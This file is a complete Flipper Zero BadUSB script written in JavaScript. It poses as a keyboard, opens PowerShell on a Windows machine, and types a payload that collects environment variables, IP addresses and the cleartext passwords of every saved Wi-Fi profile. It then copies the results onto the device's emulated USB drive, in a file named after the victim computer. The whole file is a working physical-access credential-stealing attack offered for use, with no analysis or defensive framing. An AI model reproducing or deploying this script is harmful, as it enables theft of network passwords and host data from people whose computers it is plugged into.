let image = "/ext/apps_assets/mass_storage/test.img";
let size = 8 * 1024 * 1024;
let script = [
	"$Date = Get-Date -Format yyyy-MM-dd;",
	"$Time = Get-Date -Format hh-mm-ss;",
	"dir env: >> stats.txt;",
	"Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;",
	"(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;",
];

let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

print("Checking for Image...");
if (storage.exists(image)) {
    print ("Storage Exists.");
}
else {
	print ("Creating Storage...");
	usbdisk.createImage(image, size);
}

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "x");
delay(300);
badusb.press("i");
delay(3000);
print("Running payload");
badusb.println(command, 10);
badusb.press("ENTER");
badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path stats.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; exit")
badusb.press("ENTER");
badusb.quit();

delay(2000);
usbdisk.start(image);
print("Please wait until powershell window closes to eject...");

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Done");